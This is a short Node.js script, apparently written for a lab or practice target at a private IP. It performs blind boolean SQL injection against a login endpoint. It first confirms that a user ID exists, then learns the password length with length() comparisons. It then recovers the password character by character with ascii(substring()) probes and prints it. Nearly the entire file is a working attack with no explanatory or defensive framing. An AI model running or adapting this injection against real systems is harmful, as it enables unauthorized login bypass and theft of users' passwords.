const asciiTable = {
    " ": 32,
    "!": 33,
    '"': 34,
    "#": 35,
    "$": 36,
    "%": 37,
    "&": 38,
    "'": 39,
    "(": 40,
    ")": 41,
    "*": 42,
    "+": 43,
    ",": 44,
    "-": 45,
    ".": 46,
    "/": 47,
    "0": 48,
    "1": 49,
    "2": 50,
    "3": 51,
    "4": 52,
    "5": 53,
    "6": 54,
    "7": 55,
    "8": 56,
    "9": 57,
    ":": 58,
    ";": 59,
    "<": 60,
    "=": 61,
    ">": 62,
    "?": 63,
    "@": 64,
    "A": 65,
    "B": 66,
    "C": 67,
    "D": 68,
    "E": 69,
    "F": 70,
    "G": 71,
    "H": 72,
    "I": 73,
    "J": 74,
    "K": 75,
    "L": 76,
    "M": 77,
    "N": 78,
    "O": 79,
    "P": 80,
    "Q": 81,
    "R": 82,
    "S": 83,
    "T": 84,
    "U": 85,
    "V": 86,
    "W": 87,
    "X": 88,
    "Y": 89,
    "Z": 90,
    "[": 91,
    "\\": 92,
    "]": 93,
    "^": 94,
    "_": 95,
    "`": 96,
    "a": 97,
    "b": 98,
    "c": 99,
    "d": 100,
    "e": 101,
    "f": 102,
    "g": 103,
    "h": 104,
    "i": 105,
    "j": 106,
    "k": 107,
    "l": 108,
    "m": 109,
    "n": 110,
    "o": 111,
    "p": 112,
    "q": 113,
    "r": 114,
    "s": 115,
    "t": 116,
    "u": 117,
    "v": 118,
    "w": 119,
    "x": 120,
    "y": 121,
    "z": 122,
    "{": 123,
    "|": 124,
    "}": 125,
    "~": 126,
}

const superagent = require('superagent');
const endpoint = "http://10.10.12.2:3000/login";
const loginFailed = 'LOGN FAILED!'
async function findPassword(userId) {
    const existcheck = `' or id = ${userId} -- ` ;
    const isExist = await superagent
                        .post(endpoint)
                        .send(`identity=${existcheck}`)
                        .send(`password=`);
    if (isExist.text !== loginFailed) {
        let passwordLength = 0;
        
        for(let i=0;i<100;++i) {
            const passwordLengthCheck = `' or (id=${userId} and length(password) > ${i}) -- `;
            const passwordLengthResponse = await superagent
            .post(endpoint)
            .send(`identity=${passwordLengthCheck}`)
            .send(`password=`);
            if (passwordLengthResponse.text === loginFailed) {
                break;
            }
            passwordLength++;
        }
        let password = '';
        const asciis = Object.keys(asciiTable).sort((n1, n2) => {
            return asciiTable[n1] - asciiTable[n2];
        });
        for (let i=0; i<passwordLength; i++) {
            for (let j=0; j<asciis.length; j++) {
                const characterCheck = `' or (id= ${userId} and ascii(substring(password, ${i+1}, 1)) > ascii('${asciis[j]}')) -- `;
                const characterCheckResponse = await superagent.post(endpoint)
                                                                .send(`identity=${characterCheck}`)
                                                                .send(`password=`);
                if (characterCheckResponse.text === loginFailed) {
                    password += asciis[j];
                    break;
                }
            }
        }
        console.log(password);
        return password;
    } else {
        console.log('There is a problem');
        return false;
    }
}

findPassword(2).then((result) => {
    console.log("Done!", result);
});